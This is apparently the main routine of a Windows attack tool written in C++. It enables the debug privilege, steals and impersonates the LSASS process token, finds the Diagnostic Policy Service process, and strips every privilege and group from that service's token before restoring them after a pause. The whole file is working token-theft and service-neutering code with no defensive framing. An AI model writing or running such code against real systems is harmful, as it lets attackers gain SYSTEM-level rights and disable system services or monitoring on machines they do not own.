#include "token.hpp"
#include "util.hpp"

auto main() -> __int32 {
    if (!EnableDebugPrivilege()) {
        std::cerr << "Failed to enable SeDebugPrivilege.\n";
        return 1;
    }

    HANDLE hLsassToken = GetLsassToken();
    if (!hLsassToken) {
        std::cerr << "Failed to get LSASS token.\n";
        return 1;
    }

    HANDLE hDupToken = ImpersonateWithToken(hLsassToken);
    if (!hDupToken) {
        std::cerr << "Failed to impersonate LSASS.\n";
        CloseHandle(hLsassToken);
        return 1;
    }

    DWORD dpsPID = findProcessByServiceName(L"DPS");
    if (dpsPID == 0) {
        std::cerr << "Failed to find the Diagnostic Policy Service process.\n";
        CloseHandle(hDupToken);
        CloseHandle(hLsassToken);
        return 1;
    }

    HANDLE hDpsToken = GetDpsToken(dpsPID);
    if (!hDpsToken) {
        std::cerr << "Failed to get process' token.\n";
        CloseHandle(hDupToken);
        CloseHandle(hLsassToken);
        return 1;
    }

    disableTokenPrivileges(hDpsToken);
    disableTokenGroups(hDpsToken);

    std::cout << "Operation completed. Continuing will restore the previous status of all token privileges and groups.\n";
    system("pause");

    enableAllTokenGroups(hDpsToken);
    enableAllTokenPrivileges(hDpsToken);

    CloseHandle(hDpsToken);
    CloseHandle(hDupToken);
    CloseHandle(hLsassToken);

    return 0;
}
